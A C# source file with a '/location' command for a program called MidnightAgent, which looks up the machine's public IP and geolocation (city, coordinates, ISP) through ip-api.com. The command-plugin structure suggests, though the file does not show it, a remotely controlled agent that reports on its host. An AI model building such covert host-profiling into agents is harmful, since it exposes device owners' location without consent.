using System;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /location - Get IP-based location
    /// </summary>
    public class LocationFeature : IFeature
    {
        public string Command => "location";
        public string Description => "Get IP-based location";
        public string Usage => "/location";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                using (var client = new WebClient())
                {
                    string json = await client.DownloadStringTaskAsync("http://ip-api.com/json");
                    var data = JObject.Parse(json);

                    string result = $@"📍 <b>Location Info</b>
━━━━━━━━━━━━━━━━━━━━━
🌐 IP: {data["query"]}
🏳️ Country: {data["country"]} ({data["countryCode"]})
🏙️ City: {data["city"]}
📍 Region: {data["regionName"]}
📮 Zip: {data["zip"]}
🌍 Coordinates: {data["lat"]}, {data["lon"]}
🕐 Timezone: {data["timezone"]}
📡 ISP: {data["isp"]}
🏢 Org: {data["org"]}";

                    return FeatureResult.Ok(result);
                }
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Location lookup failed: {ex.Message}");
            }
        }
    }
}
